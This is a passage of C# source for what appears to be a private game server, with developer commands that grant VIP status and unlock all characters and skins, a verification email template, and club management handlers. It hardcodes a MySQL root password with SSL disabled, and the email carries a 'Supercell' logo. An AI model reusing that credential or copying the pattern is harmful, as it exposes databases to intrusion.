                        if (dsadasdd.Home.PremiumEndTime < DateTime.UtcNow)
                        {
                            dsadasdd.Home.PremiumEndTime = DateTime.UtcNow.AddMonths(1);
                        }
                        else
                        {
                            dsadasdd.Home.PremiumEndTime = dsadasdd.Home.PremiumEndTime.AddMonths(1);
                        }

                        dsadasdd.Avatar.PremiumLevel = 1;
                        HomeMode.Home.HasPremiumPass = true;
                        long timestamp = DateTime.Now.Ticks / TimeSpan.TicksPerSecond;
                        int timestamps = Convert.ToInt32(timestamp % int.MaxValue);

                        Notification nn = new Notification
                        {
                            Id = 89,
                            DonationCount = 1000,
                            TimePassed = Convert.ToInt32(timestamps),
                            MessageEntry = $"<c6>Vip Plus {dsadasdd.Home.PremiumEndTime} UTC'ye kadar etkinleştirildi/uzatıldı, sunucuyu desteklediğiniz için teşekkürler!</c>\r\n"
                        };
                        dsadasdd.Home.NotificationFactory.Add(nn);
                        LogicAddNotificationCommand acmd = new()
                        {
                            Notification = nn
                        };
                        AvailableServerCommandMessage asmd = new AvailableServerCommandMessage();
                        asmd.Command = acmd;
                        ExecuteUnlockAllForAccount(cmd[1]);
                        if (Sessions.IsSessionActive(qwidd))
                        {
                            var session = Sessions.GetSession(qwidd);
                            session.GameListener.SendTCPMessage(asmd);
                        }
                        break;
                    case "ultravip":
                        if (!HomeMode.Avatar.IsDev)
                        {

                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        if (cmd.Length != 2)
                        {
                            Console.WriteLine("Usage: /changevalue [TAG] [FieldName] [Value]");
                            return;
                        }

                        long qwiddd = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account dsadasddd = Accounts.Load(qwiddd);
                        if (dsadasddd == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }
                        if (dsadasddd.Home.PremiumEndTime < DateTime.UtcNow)
                        {
                            dsadasddd.Home.PremiumEndTime = DateTime.UtcNow.AddMonths(3);
                        }
                        else
                        {
                            dsadasddd.Home.PremiumEndTime = dsadasddd.Home.PremiumEndTime.AddMonths(3);
                        }

                        dsadasddd.Avatar.PremiumLevel = 2;
                        HomeMode.Home.HasPremiumPass = true;
                        Notification nnd = new Notification
                        {
                            Id = 89,
                            DonationCount = 7000,
                            //TimePassed = 
                            MessageEntry = $"<c6>Vip Ultra {dsadasddd.Home.PremiumEndTime} UTC'ye kadar etkinleştirildi/uzatıldı, sunucuyu desteklediğiniz için teşekkürler!</c>\r\n"
                        };
                        dsadasddd.Home.NotificationFactory.Add(nnd);
                        LogicAddNotificationCommand acmdd = new()
                        {
                            Notification = nnd
                        };
                        AvailableServerCommandMessage asmdd = new AvailableServerCommandMessage();
                        asmdd.Command = acmdd;
                        ExecuteUnlockAllForAccount(cmd[1]);
                        if (Sessions.IsSessionActive(qwiddd))
                        {
                            var session = Sessions.GetSession(qwiddd);
                            session.GameListener.SendTCPMessage(asmdd);
                        }
                        break;
                    case "unlockall":
                        if (!HomeMode.Avatar.IsDev)
                        {

                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        if (cmd.Length != 2)
                        {
                            Console.WriteLine("Usage: /changevalue [TAG] [FieldName] [Value]");
                            return;
                        }

                        long qwidddddd = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account dsadasdddddd = Accounts.Load(qwidddddd);
                        if (dsadasdddddd == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }

                        ExecuteUnlockAllForAccount(cmd[1]);
                        break;
                    case "allskins":
                        if (!HomeMode.Avatar.IsDev)
                        {

                            response.Entry.Message = hakkinizYok; // /usecode [code] - use bonus code
                            Connection.Send(response);
                            return;
                        }
                        if (cmd.Length != 2)
                        {
                            Console.WriteLine("Usage: /changevalue [TAG] [FieldName] [Value]");
                            return;
                        }

                        long qwiddddd = LogicLongCodeGenerator.ToId(cmd[1]);
                        Account dsadasddddd = Accounts.Load(qwiddddd);
                        if (dsadasddddd == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }

                        ExecuteUnlockAllSkinsForAccount(cmd[1]);
                        break;

                    default:
                        response.Entry.Message = $"Unknown command \"{cmd[0]}\" - type \"/help\" to get command list!";
                        Connection.Send(response);
                        break;
                }

                return;
            }

            if (!kodorhani)
            {
                alliance.SendChatMessage(HomeMode.Avatar.AccountId, message.Message);
            }
        }

        private void sendRegisterMail(string mail, int randomkod)
        {
            string htmlBody = $@"
            <html>
            <head>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        text-align: center;
                    }}
                    .container {{
                        width: 100%;
                        max-width: 600px;
                        margin: auto;
                        padding: 20px;
                        border: 1px solid #e1e1e1;
                        background-color: #f9f9f9;
                    }}
                    .header {{
                        background-color: #0099cc;
                        padding: 10px;
                        color: white;
                        font-size: 24px;
                        text-align: center;
                    }}
                    .code {{
                        font-size: 32px;
                        margin: 20px 0;
                        padding: 10px;
                        background-color: #f1f1f1;
                        border: 1px solid #ddd;
                    }}
                </style>
            </head>
            <body>
               <table role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"" align=""center"" width=""100%"" style=""max-width:600px"" class=""m_-6723741535767213735email-container"">

                
                <tbody><tr>
                    <td bgcolor=""#051036"" align=""center"" valign=""top"" style=""text-align:center;background-position:center center!important;background-size:cover!important"">
                        
                        <div>
                            
                            <table role=""presentation"" border=""0"" cellpadding=""0"" cellspacing=""0"" align=""center"" width=""100%"" style=""max-width:600px;margin:auto"">



                                <tbody><tr>
                                  <td align=""right"" valign=""middle"">

                                  <table role=""presentation"" border=""0"" cellpadding=""0"" cellspacing=""0"" align=""center"" width=""100%"" style=""max-width:600px;margin:auto"">
                                     <tbody><tr>
                                         <td valign=""middle"" style=""text-align:center;padding:0"">

                                            <img src=""https://i.hizliresim.com/m1jmc7m.png"" width=""100%"" alt=""Tara ID"" border=""0"" style=""display:block;height:auto;font-family:'Roboto',sans-serif;font-size:15px;line-height:20px;color:#fff"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""><div class=""a6S"" dir=""ltr"" style=""opacity: 0.01; left: 1040px; top: 99px;""><span data-is-tooltip-wrapper=""true"" class=""a5q"" jsaction=""JIbuQc:.CLIENT""><button class=""VYBDae-JX-I VYBDae-JX-I-ql-ay5-ays CgzRE"" jscontroller=""PIVayb"" jsaction=""click:h5M12e; clickmod:h5M12e;pointerdown:FEiYhc;pointerup:mF5Elf;pointerenter:EX0mI;pointerleave:vpvbp;pointercancel:xyn4sd;contextmenu:xexox;focus:h06R8; blur:zjh6rb;mlnRJb:fLiPzd;"" data-idom-class=""CgzRE"" jsname=""hRZeKc"" aria-label="" adlı eki indir"" data-tooltip-enabled=""true"" data-tooltip-id=""tt-c10"" data-tooltip-classes=""AZPksf"" id="""" jslog=""91252; u014N:cOuCgd,Kr2w4b,xr6bB; 4:WyIjbXNnLWY6MTgwNDM4NTU4Mzc2Mzg4NzcxNSJd; 43:WyJpbWFnZS9qcGVnIl0.""><span class=""OiePBf-zPjgPe VYBDae-JX-UHGRz""></span><span class=""bHC-Q"" data-unbounded=""false"" jscontroller=""LBaJxb"" jsname=""m9ZlFb"" soy-skip="""" ssk=""6:RWVI5c""></span><span class=""VYBDae-JX-ank-Rtc0Jf"" jsname=""S5tZuc"" aria-hidden=""true""><span class=""bzc-ank"" aria-hidden=""true""><svg viewBox=""0 -960 960 960"" height=""20"" width=""20"" focusable=""false"" class="" aoH""><path d=""M480-336L288-528l51-51L444-474V-816h72v342L621-579l51,51L480-336ZM263.72-192Q234-192 213-213.15T192-264v-72h72v72H696v-72h72v72q0,29.7-21.16,50.85T695.96-192H263.72Z""></path></svg></span></span><div class=""VYBDae-JX-ano""></div></button><div class=""ne2Ple-oshW8e-J9"" id=""tt-c10"" role=""tooltip"" aria-hidden=""true"">İndir</div></span></div>

                                         </td>
                                     </tr>
                                  </tbody></table>

                                  </td>
                                </tr>



                            </tbody></table>
                            
                        </div>
                        
                    </td>
                </tr>
                

                

                <tr>
                    <td bgcolor=""#FFFFFF"">
                        <table role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"" width=""100%"" align=""center"" bgcolor=""#FFFFFF"">
                            <tbody><tr>
                                <td style=""padding:40px 40px 20px 40px;text-align:center"">

                                    <img src=""https://i.hizliresim.com/bjtwtve.png"" width=""100%"" alt=""Welcome Back!"" border=""0"" style=""display:block;height:auto;font-family:'Roboto',sans-serif;font-size:15px;line-height:20px;color:#fff;max-width:408px;margin:0 auto"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""><div class=""a6S"" dir=""ltr"" style=""opacity: 0.01; left: 944px; top: 349px;""><span data-is-tooltip-wrapper=""true"" class=""a5q"" jsaction=""JIbuQc:.CLIENT""><button class=""VYBDae-JX-I VYBDae-JX-I-ql-ay5-ays CgzRE"" jscontroller=""PIVayb"" jsaction=""click:h5M12e; clickmod:h5M12e;pointerdown:FEiYhc;pointerup:mF5Elf;pointerenter:EX0mI;pointerleave:vpvbp;pointercancel:xyn4sd;contextmenu:xexox;focus:h06R8; blur:zjh6rb;mlnRJb:fLiPzd;"" data-idom-class=""CgzRE"" jsname=""hRZeKc"" aria-label="" adlı eki indir"" data-tooltip-enabled=""true"" data-tooltip-id=""tt-c9"" data-tooltip-classes=""AZPksf"" id="""" jslog=""91252; u014N:cOuCgd,Kr2w4b,xr6bB; 4:WyIjbXNnLWY6MTgwNDM4NTU4Mzc2Mzg4NzcxNSJd; 43:WyJpbWFnZS9qcGVnIl0.""><span class=""OiePBf-zPjgPe VYBDae-JX-UHGRz""></span><span class=""bHC-Q"" data-unbounded=""false"" jscontroller=""LBaJxb"" jsname=""m9ZlFb"" soy-skip="""" ssk=""6:RWVI5c""></span><span class=""VYBDae-JX-ank-Rtc0Jf"" jsname=""S5tZuc"" aria-hidden=""true""><span class=""bzc-ank"" aria-hidden=""true""><svg viewBox=""0 -960 960 960"" height=""20"" width=""20"" focusable=""false"" class="" aoH""><path d=""M480-336L288-528l51-51L444-474V-816h72v342L621-579l51,51L480-336ZM263.72-192Q234-192 213-213.15T192-264v-72h72v72H696v-72h72v72q0,29.7-21.16,50.85T695.96-192H263.72Z""></path></svg></span></span><div class=""VYBDae-JX-ano""></div></button><div class=""ne2Ple-oshW8e-J9"" id=""tt-c9"" role=""tooltip"" aria-hidden=""true"">İndir</div></span></div>

                                </td>
                            </tr>
                            <tr>
                                <td style=""padding:20px 40px 20px 40px;text-align:center"">

                                    <h1 style=""margin:0;font-family:'Roboto','Arial',sans-serif;font-size:32px;line-height:40px;color:#333333;font-weight:bold;letter-spacing:0px"">Hoş geldiniz!</h1>

                                </td>
                            </tr>
                            <tr>
                                <td style=""padding:0px 40px 20px 40px;font-family:'Roboto',sans-serif;font-size:17px;line-height:20px;color:#555555;text-align:center;font-weight:300"">


                                    <p style=""margin:0 0 5px 0"">Giriş yapmak için aşağıdaki doğrulama kodunu kullanın.</p>


                            </td></tr>
                            <tr>
                                <td style=""padding:20px 40px 40px 40px;text-align:center"" align=""center"">

                                    
                                    <table role=""presentation"" align=""center"" cellspacing=""0"" cellpadding=""0"" border=""0"" class=""m_-6723741535767213735center-on-narrow"">
                                        <tbody><tr>
                                            <td style=""border-radius:8px;background:#ffffff;text-align:center"">
                                                <div style=""background:#ffffff;border:2px solid #e2e2e2;font-family:'Roboto',sans-serif;font-size:30px;line-height:1.1;text-align:center;text-decoration:none;display:block;border-radius:8px;font-weight:bold;padding:10px 40px"">
                                                    <span style=""color:#333;letter-spacing:5px"">" + String.Format("{0:### ###}", randomkod) + $@"</span>
                                                </div>
                                            </td>
                                        </tr>
                                    </tbody></table>
                                    

                                </td>
                            </tr>

                        </tbody></table>
                    </td>
                </tr>
                

                
                <tr>
                    <td bgcolor=""#fff"">
                        <table role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"" width=""100%"" bgcolor=""#FFFFFF"" style=""border-top:1px solid #e2e2e2"">
                            <tbody><tr>
                                <td style=""padding:30px 30px;text-align:center;font-family:'Roboto',sans-serif;font-size:15px;line-height:20px"">

                                    <table align=""center"" style=""text-align:center"">
                                        <tbody><tr>
                                            <td style=""font-family:'Roboto',sans-serif;font-size:12px;line-height:20px;color:#555555;text-align:center;font-weight:300"">
                                                <p class=""m_-6723741535767213735disclaimer"" style=""margin-bottom:5px"">Bu e-postayı Tara ID ile giriş yapmak istediğiniz için aldınız. Giriş yapmayı istemediyseniz bu e-postayı göz ardı edebilirsiniz.</p>
                                            </td>
                                        </tr>
                                    </tbody></table>

                                </td>
                            </tr>

                        </tbody></table>
                    </td>
                </tr>
                

                
                <tr>
                    <td bgcolor=""#000000"">
                        <table role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"" width=""100%"">
                            <tbody><tr>
                                <td align=""left"" style=""padding:40px 10px 40px 40px;font-family:'Roboto',sans-serif;font-size:14px;line-height:20px;color:#ffffff;text-align:left;font-weight:300"">
                                    <p style=""margin:0 0 10px 0""><a href=""https://t.me/turk_starss.com"" style=""color:#ffffff;font-size:12px;font-weight:bold;text-decoration:none"" target=""_blank"" data-saferedirecturl=""t.me/taraservsers"">TALE BRAWL WEB</a></p>
                                    <p style=""margin:0""><a href=""https://discord.gg/tsmod"" style=""color:#ffffff;font-size:12px;font-weight:bold;text-decoration:none"" target=""_blank"" data-saferedirecturl=""https://discord.gg/tsmod"">DİSCORD</a></p>
                                </td>
                                <td align=""right"" style=""padding:40px 40px 40px 10px;text-align:right"">
                                    <img src=""https://i.hizliresim.com/50nvl5l.png"" alt=""Supercell"" width=""80"" height=""70"" class=""CToWUd"" data-bit=""iit"">
                                </td>
                            </tr>

                        </tbody></table>
                    </td>
                </tr>
                

            </tbody></table>
            </body>
            </html>";

            var messages = new MimeMessage();
            messages.From.Add(new MailboxAddress("Tara Id", ""));
            messages.To.Add(new MailboxAddress("Recipient", mail));
            messages.Subject = "Tara  ID";
            var bodyBuilder = new BodyBuilder();
            bodyBuilder.HtmlBody = htmlBody;
            messages.Body = bodyBuilder.ToMessageBody();

            using (var client = new SmtpClient())
            {
                try
                {

                    string smtpHost = "";
                    int smtpPort = 465;
                    string smtpUser = "";
                    string smtpPass = "";

                    client.Connect("", 465, true);
                    client.Authenticate("", "");

                    client.Send(messages);
                    Console.WriteLine("Mail başarıyla gönderildi.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Posta gönderme hatası: " + ex.Message);
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("Inner exception: " + ex.InnerException.Message);
                    }
                }
                finally
                {
                    client.Disconnect(true);
                }
            }


        }
        private void JoinAllianceReceived(JoinAllianceMessage message)
        {
            if (HomeMode.Avatar.Name == "Brawler" || HomeMode.Avatar.Name.Contains("holoпoст")) return;
            if (HomeMode.Avatar.NameSetByUser == false) return;
            if (HomeMode.Avatar.Trophies < 8)
            {
                if (HomeMode.Home.Sha == "d2b237661579b6b211322f760b9126ee33288e1etb")
                {
                    AllianceResponseMessage res = new AllianceResponseMessage();
                    res.ResponseType = 690031;
                    Connection.Send(res);
                    return;
                }
                else
                {
                    return;
                }
            }
            if (HomeMode.Home.Device.Contains("GOVNO")) return;

            Alliance alliance = Alliances.Load(message.AllianceId);
            if (alliance.RequiredTrophies > HomeMode.Avatar.Trophies) //fixler
            {
                //File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                //Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (HomeMode.Avatar.AllianceId > 0) return;
            if (alliance == null) return;
            if (alliance.Type == 3) return; //kapalı klup
            if (alliance.Members.Count >= 100 && HomeMode.Avatar.AccountId != 1 && HomeMode.Avatar.AccountId != 2 && message.AllianceId != 1) return;
            if (HomeMode.Avatar.Name.Contains("holonos") || HomeMode.Avatar.Name.Contains("t,me") || HomeMode.Avatar.Name.Contains("t.me")) return;
            AllianceStreamEntry entry = new AllianceStreamEntry();
            entry.AuthorId = HomeMode.Avatar.AccountId;
            entry.AuthorName = HomeMode.Avatar.Name;
            entry.Id = ++alliance.Stream.EntryIdCounter;
            entry.PlayerId = HomeMode.Avatar.AccountId;
            entry.PlayerName = HomeMode.Avatar.Name;
            entry.Type = 4;
            entry.Event = 3;
            entry.AuthorRole = HomeMode.Avatar.AllianceRole;
            alliance.AddStreamEntry(entry);

            if (HomeMode.Avatar.AccountId == 1 || HomeMode.Avatar.AccountId == 2)
            {
                HomeMode.Avatar.AllianceRole = AllianceRole.Leader;
            }
            else HomeMode.Avatar.AllianceRole = AllianceRole.Member;
            HomeMode.Avatar.AllianceId = alliance.Id;
            alliance.Members.Add(new AllianceMember(HomeMode.Avatar));

            AllianceResponseMessage response = new AllianceResponseMessage();
            response.ResponseType = 40;
            Connection.Send(response);

            SendMyAllianceData(alliance);
        }
        private void LeaveAllianceReceived(LeaveAllianceMessage message)
        {
            if (HomeMode.Avatar.AllianceId < 0 || HomeMode.Avatar.AllianceRole == AllianceRole.None) return;

            Alliance alliance = Alliances.Load(HomeMode.Avatar.AllianceId);
            if (alliance == null) return;

            if (HomeMode.Avatar.AllianceRole == AllianceRole.Leader)
            {
                AllianceMember nextLeader = alliance.GetNextRoleMember();
                if (nextLeader == null)
                {
                    alliance.RemoveMemberById(HomeMode.Avatar.AccountId);
                    if (alliance.Members.Count < 1)
                    {
                        Alliances.Delete(HomeMode.Avatar.AllianceId);
                    }
                    HomeMode.Avatar.AllianceId = -1;
                    HomeMode.Avatar.AllianceRole = AllianceRole.None;

                    Connection.Send(new AllianceResponseMessage
                    {
                        ResponseType = 80
                    });

                    Connection.Send(new MyAllianceMessage());

                    return;
                };
                Account target = Accounts.Load(nextLeader.AccountId);
                if (target == null) return;
                target.Avatar.AllianceRole = AllianceRole.Leader;
                nextLeader.Role = AllianceRole.Leader;
                if (LogicServerListener.Instance.IsPlayerOnline(target.AccountId))
                {
                    LogicServerListener.Instance.GetGameListener(target.AccountId).SendTCPMessage(new AllianceResponseMessage()
                    {
                        ResponseType = 101
                    });
                    MyAllianceMessage targetAlliance = new()
                    {
                        AllianceHeader = alliance.Header,
                        Role = HomeMode.Avatar.AllianceRole
                    };
                    LogicServerListener.Instance.GetGameListener(target.AccountId).SendTCPMessage(targetAlliance);
                }
            }
            alliance.RemoveMemberById(HomeMode.Avatar.AccountId);
            if (alliance.Members.Count < 1)
            {
                Alliances.Delete(HomeMode.Avatar.AllianceId);
            }
            else
            {
                AllianceStreamEntry allianceentry = new()
                {
                    AuthorId = HomeMode.Avatar.AccountId,
                    AuthorName = HomeMode.Avatar.Name,
                    Id = ++alliance.Stream.EntryIdCounter,
                    PlayerId = HomeMode.Avatar.AccountId,
                    PlayerName = HomeMode.Avatar.Name,
                    Type = 4,
                    Event = 4,
                    AuthorRole = HomeMode.Avatar.AllianceRole
                };
                alliance.AddStreamEntry(allianceentry);
            }

            HomeMode.Avatar.AllianceId = -1;
            HomeMode.Avatar.AllianceRole = AllianceRole.None;

            /*AllianceStreamEntry entry = new AllianceStreamEntry();
            entry.AuthorId = HomeMode.Avatar.AccountId;
            entry.AuthorName = HomeMode.Avatar.Name;
            entry.Id = ++alliance.Stream.EntryIdCounter;
            entry.PlayerId = HomeMode.Avatar.AccountId;
            entry.PlayerName = HomeMode.Avatar.Name;
            entry.Type = 4;
            entry.Event = 4;
            entry.AuthorRole = HomeMode.Avatar.AllianceRole;
            alliance.AddStreamEntry(entry);*/

            AllianceResponseMessage response = new AllianceResponseMessage();
            response.ResponseType = 80;
            Connection.Send(response);



            MyAllianceMessage myAlliance = new MyAllianceMessage();
            Connection.Send(myAlliance);

            if (alliance.Members.Count == 0 || alliance.Members.Count < 0)
            {
                Console.WriteLine("kulüp siliniyor... bilgileri:" + alliance.Name + " , ID: " + LogicLongCodeGenerator.ToCode(alliance.Id));
                Alliances.Delete(alliance.Id);
                Console.WriteLine("silindi");
            }
        }

        static bool isemail(string email)
        {
            string[] validProviders = { "hotmail.com", "outlook.com", "outlook.com.tr", "gmail.com", "yahoo.com", "icloud.com", "protonmail.com" };

            if (string.IsNullOrWhiteSpace(email) || !email.Contains("@"))
                return false;

            string domain = email.Split('@')[1];

            foreach (string provider in validProviders)
            {
                if (domain.Equals(provider, StringComparison.OrdinalIgnoreCase))
                    return true;
            }

            return false;
        }

        private void CreateAllianceReceived(CreateAllianceMessage message)
        {
            //Console.WriteLine("createalliance" + message.Name + message.Description);
            if (HomeMode.Avatar.AllianceId >= 0) return;
            //Console.WriteLine("createalliancssssse");
            if (HomeMode.Avatar.Trophies < 8)
            {
                if (HomeMode.Home.Sha == "d2b237661579b6b211322f760b9126ee33288e1etb")
                {
                    AllianceResponseMessage res = new AllianceResponseMessage();
                    res.ResponseType = 691131;
                    Connection.Send(res);
                    return;
                }
                else
                {
                    return;
                }
            }
            if (message.Name.Length < 2)
            {
                return;
            }
            if (message.Name.Length > 15)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (message.Description.Length > 300)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }

            Alliance alliance = new Alliance();
            alliance.Name = message.Name;
            alliance.Description = message.Description;
            alliance.RequiredTrophies = message.RequiredTrophies;
            if (message.Type == 1)
            {
                alliance.Type = 1;
            }
            if (message.Type == 2)
            {
                alliance.Type = 1;
            }
            if (message.Type == 3)
            {
                alliance.Type = 3;
            }
            if (message.RequiredTrophies == 0)
            {
                alliance.RequiredTrophies = 8;
            }

            //alliance.Type = 0;

            if (message.Name == null || message.Name == "") //boşluk koruma bosluk koruma
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
         /*   if (message.Description == null || message.Description == "")
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                return;
            }*/
            if (message.BadgeId == null)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (message.Type != 1 && message.Type != 2 && message.Type != 3)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (message.kluplocation == null)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (message.RequiredTrophies == null)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }

            if (message.BadgeId >= 8000000 && message.BadgeId < 8000000 + DataTables.Get(DataType.AllianceBadge).Count)
            {
                alliance.AllianceBadgeId = message.BadgeId;
            }
            else
            {
                alliance.AllianceBadgeId = 8000000;
            }

            HomeMode.Avatar.AllianceRole = AllianceRole.Leader;
            alliance.Members.Add(new AllianceMember(HomeMode.Avatar));

            Alliances.Create(alliance);

            HomeMode.Avatar.AllianceId = alliance.Id;

            AllianceResponseMessage response = new AllianceResponseMessage();
            response.ResponseType = 20;
            Connection.Send(response);

            SendMyAllianceData(alliance);
        }

        private void AskForAllianceDataReceived(AskForAllianceDataMessage message)
        {
            Alliance alliance = Alliances.Load(message.AllianceId);
            if (alliance == null) return;

            AllianceDataMessage data = new AllianceDataMessage();
            data.Alliance = alliance;
            data.IsMyAlliance = message.AllianceId == HomeMode.Avatar.AllianceId;
            if (alliance.RequiredTrophies == 0)
            {
                alliance.RequiredTrophies = 8;
            }
            Connection.Send(data);
        }

        private void AllianceSearchReceived(AllianceSearchMessage message)
        {
            AllianceListMessage list = new AllianceListMessage();
            list.query = message.SearchValue;

            if (!message.SearchValue.StartsWith("#"))
            {
                List<Alliance> alliances = Alliances.GetRankingListSearch(message.SearchValue);
                foreach (Alliance alliance in alliances)
                {
                    list.clubs.Add(alliance);
                    Console.WriteLine(alliance.Name);
                }
            }
            else
            {
                List<Alliance> alliances = Alliances.GetRankingListSearchHashtag(message.SearchValue);
                foreach (Alliance alliance in alliances)
                {
                    list.clubs.Add(alliance);
                    Console.WriteLine(alliance.Name);
                }
            }


            Connection.Send(list);
        }

        private void AskForJoinableAllianceListReceived(AskForJoinableAllianceListMessage message)
        {
            JoinableAllianceListMessage list = new JoinableAllianceListMessage();
            List<Alliance> alliances = Alliances.GetRandomAlliances(10);
            foreach (Alliance alliance in alliances)
            {
                list.JoinableAlliances.Add(alliance.Header);
            }
            Connection.Send(list);
        }

        public static void ExecuteUnlockAllSkinsForAccount(string args)
        {

            long id = LogicLongCodeGenerator.ToId(args);
            Account account = Accounts.Load(id);
            if (account == null)
            {
                Console.WriteLine("Fail: account not found!");
                return;
            }

            int[] skinIds = {
    2, 5, 11, 15, 20, 25, 26, 27, 28, 29, 30, 44, 45, 47, 49, 50, 52, 56, 57, 58, 59, 60, 61, 63, 64,
    68, 69, 70, 71, 72, 75, 79, 88, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 108,
    109, 110, 111, 116, 117, 118, 120, 122, 123, 125, 126, 128, 130, 131, 132, 134, 135, 137, 139, 140, 143,
    145, 146, 147, 148, 152, 158, 159, 160, 162, 163, 165, 167, 171, 172, 173, 174, 176, 177, 178, 179, 180,
    183, 185, 186, 187, 188, 189, 190, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 208, 209, 210, 211,
    212, 213, 214
};

            foreach (int isd in skinIds)
            {

                LogicGiveDeliveryItemsCommand command = new LogicGiveDeliveryItemsCommand();
                DeliveryUnit unit = new DeliveryUnit(100);
                GatchaDrop drop = new GatchaDrop(9);

                drop.SkinGlobalId = GlobalId.CreateGlobalId(29, isd);

                drop.Count = 1;
                unit.AddDrop(drop);
                command.DeliveryUnits.Add(unit);
                ClientHome clientHome = new ClientHome();
                ClientAvatar clientAvatar = new ClientAvatar();
                LogicGameListener game = null;
                HomeMode homeMode = LogicServerListener.Instance.GetHomeMode(account.AccountId);


                command.Execute(homeMode);

                AvailableServerCommandMessage message = new AvailableServerCommandMessage();
                message.Command = command;
                homeMode.GameListener.SendMessage(message);

            }

            Logger.Print($"Successfully unlocked all brawlers for account {account.AccountId.GetHigherInt()}-{account.AccountId.GetLowerInt()} ({args[1]})");

            if (Sessions.IsSessionActive(id))
            {
                var session = Sessions.GetSession(id);
                session.GameListener.SendTCPMessage(new AuthenticationFailedMessage()
                {
                    Message = "Your account updated!"
                });
                Sessions.Remove(id);
            }
        }
        private static void ExecuteUnlockAllForAccount(string args)
        {

            long id = LogicLongCodeGenerator.ToId(args);
            Account account = Accounts.Load(id);
            if (account == null)
            {
                Console.WriteLine("Fail: account not found!");
                return;
            }

            for (int i = 0; i < 39; i++)
            {
                if (!account.Avatar.HasHero(16000000 + i))
                {
                    CharacterData character = DataTables.Get(16).GetDataWithId<CharacterData>(i);
                    CardData card = DataTables.Get(23).GetData<CardData>(character.Name + "_unlock");

                    account.Avatar.UnlockHero(character.GetGlobalId(), card.GetGlobalId());
                }
            }

            Logger.Print($"Successfully unlocked all brawlers for account {account.AccountId.GetHigherInt()}-{account.AccountId.GetLowerInt()} ({args[0]})");

            if (Sessions.IsSessionActive(id))
            {
                var session = Sessions.GetSession(id);
                session.GameListener.SendTCPMessage(new AuthenticationFailedMessage()
                {
                    Message = "Your account updated!"
                });
                Sessions.Remove(id);
            }
        }
        private bool IsValidPassword(string password)
        {
            if (password.Length < 8)
                return false;

            bool hasLetter = false;
            bool hasDigit = false;

            foreach (char c in password)
            {
                if (char.IsLetter(c))
                    hasLetter = true;
                else if (char.IsDigit(c))
                    hasDigit = true;

                if (hasLetter && hasDigit)
                    return true;
            }

            return false;
        }
        private bool CheckUserExists(string username, long id)
        {
            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "*59.CJrcPW0jv3oy";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            string connectionString = builder.ToString();
            bool exists = false;

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "SELECT COUNT(*) FROM users WHERE username = @username OR id = @id";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@username", username);
                    cmd.Parameters.AddWithValue("@id", id);

                    int count = Convert.ToInt32(cmd.ExecuteScalar());
                    exists = count > 0;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

            return exists;
        }

        private bool RegisterUserToDatabase(string username, string password, long id)
        {
